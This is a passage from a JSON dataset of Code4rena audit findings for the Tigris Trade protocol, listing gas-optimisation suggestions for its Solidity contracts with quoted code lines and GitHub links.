      "content": "Custom errors are available from solidity version 0.8.4. Custom errors save [**~50 gas**](https://gist.github.com/IllIllI000/ad1bd0d29a0101b25e57c293b4b0c746) each time they're hit by [avoiding having to allocate and store the revert string](https://blog.soliditylang.org/2021/04/21/custom-errors/#errors-in-depth). Not defining the strings also save deployment gas\n\n*There are 2 instances of this issue:*\n\n```solidity\nFile: contracts/GovNFT.sol\n\n153           require(\n154               msg.value >= messageFee,\n155               \"Must send enough value to cover messageFee\"\n156:          );\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L153-L156\n\n```solidity\nFile: contracts/utils/TradingLibrary.sol\n\n116                   require(\n117                       _priceData.price < assetChainlinkPrice+assetChainlinkPrice*2/100 &&\n118                       _priceData.price > assetChainlinkPrice-assetChainlinkPrice*2/100, \"!chainlinkPrice\"\n119:                  );\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/utils/TradingLibrary.sol#L116-L119\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43212",
      "title": "[G-19]  `require()` or `revert()` statements that check input arguments should be at the top of the function",
      "impact": "GAS",
      "content": "Checks that involve constants should come before checks that involve state variables, function calls, and calculations. By doing these checks first, the function is able to revert before wasting a Gcoldsload (**2100 gas***) in a function that may ultimately revert in the unhappy case.\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: contracts/GovNFT.sol\n\n/// @audit expensive op on line 65\n66:           require(tokenId <= 10000, \"BadID\");\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L66\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43211",
      "title": "[G-18]  Ternary unnecessary",
      "impact": "GAS",
      "content": "`z = (x == y) ? true : false` => `z = (x == y)`\n\n*There are 2 instances of this issue:*\n\n```solidity\nFile: contracts/BondNFT.sol\n\n238:          bond.expired = bond.expireEpoch <= epoch[bond.asset] ? true : false;\n\n252:          return bond.expireEpoch <= epoch[bond.asset] ? true : false;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L238\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43210",
      "title": "[G-17]  Don't compare boolean expressions to boolean literals",
      "impact": "GAS",
      "content": "`if (<x> == true)` => `if (<x>)`, `if (<x> == false)` => `if (!<x>)`\n\n*There are 2 instances of this issue:*\n\n```solidity\nFile: contracts/BondNFT.sol\n\n238:          bond.expired = bond.expireEpoch <= epoch[bond.asset] ? true : false;\n\n252:          return bond.expireEpoch <= epoch[bond.asset] ? true : false;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L238\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43209",
      "title": "[G-16]  Splitting `require()` statements that use `&&` saves gas",
      "impact": "GAS",
      "content": "See [this issue](https://github.com/code-423n4/2022-01-xdefi-findings/issues/128) which describes the fact that there is a larger deployment gas cost, but with enough runtime calls, the change ends up being cheaper by **3 gas**\n\n*There are 3 instances of this issue:*\n\n```solidity\nFile: contracts/PairsContract.sol\n\n52:           require(_maxLeverage >= _minLeverage && _minLeverage > 0, \"Wrong leverage values\");\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/PairsContract.sol#L52\n\n```solidity\nFile: contracts/Trading.sol\n\n887:              require(_proxy.proxy == _msgSender() && _proxy.time >= block.timestamp, \"Proxy not approved\");\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Trading.sol#L887\n\n```solidity\nFile: contracts/utils/TradingLibrary.sol\n\n116                   require(\n117                       _priceData.price < assetChainlinkPrice+assetChainlinkPrice*2/100 &&\n118                       _priceData.price > assetChainlinkPrice-assetChainlinkPrice*2/100, \"!chainlinkPrice\"\n119:                  );\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/utils/TradingLibrary.sol#L116-L119\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43208",
      "title": "[G-15]  Use a more recent version of solidity",
      "impact": "GAS",
      "content": "Use a solidity version of at least 0.8.2 to get simple compiler automatic inlining\n\nUse a solidity version of at least 0.8.3 to get better struct packing and cheaper multiple storage reads\n\nUse a solidity version of at least 0.8.4 to get custom errors, which are cheaper at deployment than `revert()/require()` strings\n\nUse a solidity version of at least 0.8.10 to have external calls skip contract existence checks if the external call has a return value\n\n*There are 21 instances of this issue:*\n\n```solidity\nFile: contracts/BondNFT.sol\n\n2:    pragma solidity ^0.8.0;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L2\n\n```solidity\nFile: contracts/GovNFT.sol\n\n2:    pragma solidity ^0.8.0;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L2\n\n```solidity\nFile: contracts/interfaces/IGovNFT.sol\n\n3:    pragma solidity ^0.8.0;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/interfaces/IGovNFT.sol#L3\n\n```solidity\nFile: contracts/interfaces/ILayerZeroEndpoint.sol\n\n3:    pragma solidity ^0.8.0;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/interfaces/ILayerZeroEndpoint.sol#L3\n\n```solidity\nFile: contracts/interfaces/ILayerZeroReceiver.sol\n\n3:    pragma solidity ^0.8.0;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/interfaces/ILayerZeroReceiver.sol#L3\n\n```solidity\nFile: contracts/interfaces/ILayerZeroUserApplicationConfig.sol\n\n3:    pragma solidity ^0.8.0;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/interfaces/ILayerZeroUserApplicationConfig.sol#L3\n\n```solidity\nFile: contracts/interfaces/IPairsContract.sol\n\n3:    pragma solidity ^0.8.0;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/interfaces/IPairsContract.sol#L3\n\n```solidity\nFile: contracts/interfaces/IPosition.sol\n\n3:    pragma solidity ^0.8.0;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/interfaces/IPosition.sol#L3\n\n```solidity\nFile: contracts/interfaces/IReferrals.sol\n\n3:    pragma solidity ^0.8.0;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/interfaces/IReferrals.sol#L3\n\n```solidity\nFile: contracts/interfaces/IStableVault.sol\n\n3:    pragma solidity ^0.8.0;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/interfaces/IStableVault.sol#L3\n\n```solidity\nFile: contracts/interfaces/ITrading.sol\n\n5:    pragma solidity ^0.8.0;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/interfaces/ITrading.sol#L5\n\n```solidity\nFile: contracts/Lock.sol\n\n2:    pragma solidity ^0.8.0;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L2\n\n```solidity\nFile: contracts/PairsContract.sol\n\n2:    pragma solidity ^0.8.0;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/PairsContract.sol#L2\n\n```solidity\nFile: contracts/Position.sol\n\n2:    pragma solidity ^0.8.0;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Position.sol#L2\n\n```solidity\nFile: contracts/Referrals.sol\n\n2:    pragma solidity ^0.8.0;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Referrals.sol#L2\n\n```solidity\nFile: contracts/StableToken.sol\n\n2:    pragma solidity ^0.8.0;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/StableToken.sol#L2\n\n```solidity\nFile: contracts/StableVault.sol\n\n2:    pragma solidity ^0.8.0;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/StableVault.sol#L2\n\n```solidity\nFile: contracts/TradingExtension.sol\n\n2:    pragma solidity ^0.8.0;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/TradingExtension.sol#L2\n\n```solidity\nFile: contracts/Trading.sol\n\n2:    pragma solidity ^0.8.0;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Trading.sol#L2\n\n```solidity\nFile: contracts/utils/MetaContext.sol\n\n2:    pragma solidity ^0.8.0;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/utils/MetaContext.sol#L2\n\n```solidity\nFile: contracts/utils/TradingLibrary.sol\n\n2:    pragma solidity ^0.8.0;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/utils/TradingLibrary.sol#L2\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43207",
      "title": "[G-14]  Optimize names to save gas",
      "impact": "GAS",
      "content": "`public`/`external` function names and `public` member variable names can be optimized to save gas. See [this](https://gist.github.com/IllIllI000/a5d8b486a8259f9f77891a919febd1a9) link for an example of how it works. Below are the interfaces/abstract contracts that can be optimized so that the most frequently-called functions use the least amount of gas possible during method lookup. Method IDs that have two leading zero bytes can save **128 gas** each during deployment, and renaming functions to have lower method IDs will save **22 gas** per call, [per sorted position shifted](https://medium.com/joyso/solidity-how-does-function-name-affect-gas-consumption-in-smart-contract-47d270d8ac92)\n\n*There are 25 instances of this issue:*\n\n```solidity\nFile: contracts/BondNFT.sol\n\n/// @audit createLock(), extendLock(), release(), claim(), claimDebt(), distribute(), idToBond(), isExpired(), pending(), getAssets(), safeTransferMany(), safeTransferFromMany(), approveMany(), balanceIds(), addAsset(), setAllowedAsset(), setBaseURI(), setManager()\n8:    contract BondNFT is ERC721Enumerable, Ownable {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L8\n\n```solidity\nFile: contracts/GovNFT.sol\n\n/// @audit setBaseURI(), _bridgeMint(), mintMany(), setTrustedAddress(), crossChain(), nonblockingLzReceive(), retryMessage(), estimateFees(), setGas(), setEndpoint(), safeTransferMany(), safeTransferFromMany(), approveMany(), claim(), distribute(), pending(), addAsset(), setAllowedAsset(), setMaxBridge(), assetsLength(), allowedAsset(), balanceIds()\n12:   contract GovNFT is ERC721Enumerable, ILayerZeroReceiver, MetaContext, IGovNFT {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L12\n\n```solidity\nFile: contracts/interfaces/IBondNFT.sol\n\n/// @audit createLock(), extendLock(), claim(), claimDebt(), release(), distribute(), ownerOf(), getAssets()\n4:    interface IBondNFT {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/interfaces/IBondNFT.sol#L4\n\n```solidity\nFile: contracts/interfaces/IGovNFT.sol\n\n/// @audit distribute(), safeTransferMany(), claim(), pending()\n5:    interface IGovNFT {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/interfaces/IGovNFT.sol#L5\n\n```solidity\nFile: contracts/interfaces/ILayerZeroEndpoint.sol\n\n/// @audit send(), receivePayload(), getInboundNonce(), getOutboundNonce(), estimateFees(), getChainId(), retryPayload(), hasStoredPayload(), getSendLibraryAddress(), getReceiveLibraryAddress(), isSendingPayload(), isReceivingPayload(), getConfig(), getSendVersion(), getReceiveVersion()\n7:    interface ILayerZeroEndpoint is ILayerZeroUserApplicationConfig {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/interfaces/ILayerZeroEndpoint.sol#L7\n\n```solidity\nFile: contracts/interfaces/ILayerZeroReceiver.sol\n\n/// @audit lzReceive()\n5:    interface ILayerZeroReceiver {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/interfaces/ILayerZeroReceiver.sol#L5\n\n```solidity\nFile: contracts/interfaces/ILayerZeroUserApplicationConfig.sol\n\n/// @audit setConfig(), setSendVersion(), setReceiveVersion(), forceResumeReceive()\n5:    interface ILayerZeroUserApplicationConfig {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/interfaces/ILayerZeroUserApplicationConfig.sol#L5\n\n```solidity\nFile: contracts/interfaces/IPairsContract.sol\n\n/// @audit allowedAsset(), idToAsset(), idToOi(), setAssetBaseFundingRate(), modifyLongOi(), modifyShortOi()\n5:    interface IPairsContract {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/interfaces/IPairsContract.sol#L5\n\n```solidity\nFile: contracts/interfaces/IPosition.sol\n\n/// @audit trades(), executeLimitOrder(), modifyMargin(), addToPosition(), reducePosition(), assetOpenPositions(), assetOpenPositionsIndexes(), limitOrders(), limitOrderIndexes(), assetOpenPositionsLength(), limitOrdersLength(), ownerOf(), mint(), burn(), modifyTp(), modifySl(), getCount(), updateFunding(), setAccInterest()\n5:    interface IPosition {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/interfaces/IPosition.sol#L5\n\n```solidity\nFile: contracts/interfaces/IReferrals.sol\n\n/// @audit createReferralCode(), setReferred(), getReferred(), getReferral()\n5:    interface IReferrals {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/interfaces/IReferrals.sol#L5\n\n```solidity\nFile: contracts/interfaces/IStableVault.sol\n\n/// @audit deposit(), withdraw(), allowed(), stable()\n5:    interface IStableVault {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/interfaces/IStableVault.sol#L5\n\n```solidity\nFile: contracts/interfaces/ITrading.sol\n\n/// @audit initiateMarketOrder(), initiateCloseOrder(), addMargin(), removeMargin(), addToPosition(), initiateLimitOrder(), cancelLimitOrder(), updateTpSl(), executeLimitOrder(), liquidatePosition(), limitClose()\n7:    interface ITrading {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/interfaces/ITrading.sol#L7\n\n```solidity\nFile: contracts/Lock.sol\n\n/// @audit claim(), claimDebt(), lock(), extendLock(), release(), claimGovFees(), editAsset(), sendNFTs()\n10:   contract Lock is Ownable{\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L10\n\n```solidity\nFile: contracts/PairsContract.sol\n\n/// @audit idToAsset(), idToOi(), setAssetChainlinkFeed(), addAsset(), updateAssetLeverage(), setAssetBaseFundingRate(), updateAssetFeeMultiplier(), pauseAsset(), setMaxBaseFundingRate(), setProtocol(), setMaxOi(), modifyLongOi(), modifyShortOi()\n8:    contract PairsContract is Ownable, IPairsContract {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/PairsContract.sol#L8\n\n```solidity\nFile: contracts/Position.sol\n\n/// @audit isMinter(), trades(), openPositions(), openPositionsIndexes(), assetOpenPositions(), assetOpenPositionsIndexes(), limitOrders(), limitOrderIndexes(), setBaseURI(), updateFunding(), mint(), executeLimitOrder(), modifyMargin(), addToPosition(), setAccInterest(), reducePosition(), modifyTp(), modifySl(), burn(), assetOpenPositionsLength(), limitOrdersLength(), getCount(), userTrades(), openPositionsSelection(), setMinter()\n9:    contract Position is ERC721Enumerable, MetaContext, IPosition {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Position.sol#L9\n\n```solidity\nFile: contracts/Referrals.sol\n\n/// @audit createReferralCode(), setReferred(), getReferred(), getReferral(), setProtocol(), initRefs()\n7:    contract Referrals is Ownable, IReferrals {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Referrals.sol#L7\n\n```solidity\nFile: contracts/StableToken.sol\n\n/// @audit mintFor(), setMinter()\n7:    contract StableToken is ERC20Permit, MetaContext {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/StableToken.sol#L7\n\n```solidity\nFile: contracts/StableVault.sol\n\n/// @audit mintFor()\n9:    interface IERC20Mintable is IERC20 {\n\n/// @audit deposit(), depositWithPermit(), withdraw(), listToken(), delistToken()\n27:   contract StableVault is MetaContext, IStableVault {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/StableVault.sol#L9\n\n```solidity\nFile: contracts/TradingExtension.sol\n\n/// @audit minPos(), _closePosition(), _limitClose(), _checkGas(), modifyShortOi(), modifyLongOi(), setMaxGasPrice(), getRef(), getVerifiedPrice(), _setReferral(), validateTrade(), setValidSignatureTimer(), setChainlinkEnabled(), setNode(), setAllowedMargin(), setMinPositionSize(), setPaused()\n10:   contract TradingExtension is Ownable{\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/TradingExtension.sol#L10\n\n```solidity\nFile: contracts/Trading.sol\n\n/// @audit getVerifiedPrice(), getRef(), _setReferral(), validateTrade(), isPaused(), minPos(), modifyLongOi(), modifyShortOi(), _limitClose(), _checkGas(), _closePosition()\n14:   interface ITradingExtension {\n\n/// @audit burnFrom(), mintFor()\n58:   interface IStable is IERC20 {\n\n/// @audit initiateMarketOrder(), initiateCloseOrder(), addToPosition(), initiateLimitOrder(), cancelLimitOrder(), addMargin(), removeMargin(), updateTpSl(), executeLimitOrder(), liquidatePosition(), limitClose(), approveProxy(), setBlockDelay(), setAllowedVault(), setMaxWinPercent(), setLimitOrderPriceRange(), setFees(), setTradingExtension()\n79:   contract Trading is MetaContext, ITrading {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Trading.sol#L14\n\n```solidity\nFile: contracts/utils/MetaContext.sol\n\n/// @audit setTrustedForwarder(), isTrustedForwarder()\n6:    contract MetaContext is Ownable {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/utils/MetaContext.sol#L6\n\n```solidity\nFile: contracts/utils/TradingLibrary.sol\n\n/// @audit pnl(), liqPrice(), getLiqPrice(), verifyPrice()\n21:   library TradingLibrary {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/utils/TradingLibrary.sol#L21\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43206",
      "title": "[G-13]  `require()`/`revert()` strings longer than 32 bytes cost extra gas",
      "impact": "GAS",
      "content": "Each extra memory word of bytes past the original 32 [incurs an MSTORE](https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#consider-having-short-revert-strings) which costs **3 gas**\n\n*There are 4 instances of this issue:*\n\n```solidity\nFile: contracts/GovNFT.sol\n\n153           require(\n154               msg.value >= messageFee,\n155               \"Must send enough value to cover messageFee\"\n156:          );\n\n185:          require(msg.sender == address(this), \"NonblockingLzApp: caller must be app\");\n\n209:          require(payloadHash != bytes32(0), \"NonblockingLzApp: no stored message\");\n\n210:          require(keccak256(_payload) == payloadHash, \"NonblockingLzApp: invalid payload\");\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L153-L156\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43205",
      "title": "[G-12]  `++i`/`i++` should be `unchecked{++i}`/`unchecked{i++}` when it is not possible for them to overflow, as is the case when used in `for`- and `while`-loops",
      "impact": "GAS",
      "content": "The `unchecked` keyword is new in solidity version 0.8.0, so this only applies to that version or higher, which these instances are. This saves **30-40 gas [per loop](https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#the-increment-in-for-loop-post-condition-can-be-made-unchecked)**\n\n*There are 16 instances of this issue:*\n\n```solidity\nFile: contracts/GovNFT.sol\n\n53:           for (uint i=0; i<assetsLength(); i++) {\n\n67:           for (uint i=0; i<assetsLength(); i++) {\n\n78:           for (uint i=0; i<assetsLength(); i++) {\n\n95:           for (uint i=0; i<assetsLength(); i++) {\n\n105:          for (uint i=0; i<_amount; i++) {\n\n131:          for (uint i=0; i<tokenId.length; i++) {\n\n200:          for (uint i=0; i<tokenId.length; i++) {\n\n246:          for (uint i=0; i<_ids.length; i++) {\n\n252:          for (uint i=0; i<_ids.length; i++) {\n\n258:          for (uint i=0; i<_ids.length; i++) {\n\n325:          for (uint i=0; i<_ids.length; i++) {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L53\n\n```solidity\nFile: contracts/Lock.sol\n\n113:          for (uint i=0; i < assets.length; i++) {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L113\n\n```solidity\nFile: contracts/Position.sol\n\n296:          for (uint i=0; i<_ids.length; i++) {\n\n304:          for (uint i=0; i<_ids.length; i++) {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Position.sol#L296\n\n```solidity\nFile: contracts/Referrals.sol\n\n70:           for (uint i=0; i<_codeOwnersL; i++) {\n\n73:           for (uint i=0; i<_referredAL; i++) {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Referrals.sol#L70\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43204",
      "title": "[G-11]  Add `unchecked {}` for subtractions where the operands cannot underflow because of a previous `require()` or `if`-statement",
      "impact": "GAS",
      "content": "`require(a <= b); x = b - a` => `require(a <= b); unchecked { x = b - a }`\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: contracts/Trading.sol\n\n/// @audit if-condition on line 615\n616:              if ((_trade.margin*_trade.leverage*(DIVISION_CONSTANT-_percent)/DIVISION_CONSTANT)/1e18 < tradingExtension.minPos(_trade.tigAsset)) revert(\"!size\");\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Trading.sol#L616\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43203",
      "title": "[G-10]  `internal` functions only called once can be inlined to save gas",
      "impact": "GAS",
      "content": "Not inlining costs **20 to 40 gas** because of two extra `JUMP` instructions and additional stack operations needed for function calls.\n\n*There are 2 instances of this issue:*\n\n```solidity\nFile: contracts/BondNFT.sol\n\n323       function _transfer(\n324           address from,\n325           address to,\n326:          uint256 _id\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L323-L326\n\n```solidity\nFile: contracts/GovNFT.sol\n\n89        function _transfer(\n90            address from,\n91            address to,\n92:           uint256 tokenId\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L89-L92\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43202",
      "title": "[G-09]  `<x> += <y>` costs more gas than `<x> = <x> + <y>` for state variables",
      "impact": "GAS",
      "content": "Using the addition operator instead of plus-equals saves **[113 gas](https://gist.github.com/IllIllI000/cbbfb267425b898e5be734d4008d4fe8)**\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: contracts/GovNFT.sol\n\n52:           counter += 1;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L52\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43201",
      "title": "[G-08]  The result of function calls should be cached rather than re-calling the function",
      "impact": "GAS",
      "content": "The instances below point to the second+ call of the function within a single function\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: contracts/Trading.sol\n\n/// @audit position.getCount() on line 173\n208:              emit PositionOpened(_tradeInfo, 0, _price, position.getCount()-1, _trader, _marginAfterFees);\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Trading.sol#L208\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43200",
      "title": "[G-07]  Multiple accesses of a mapping/array should use a local variable cache",
      "impact": "GAS",
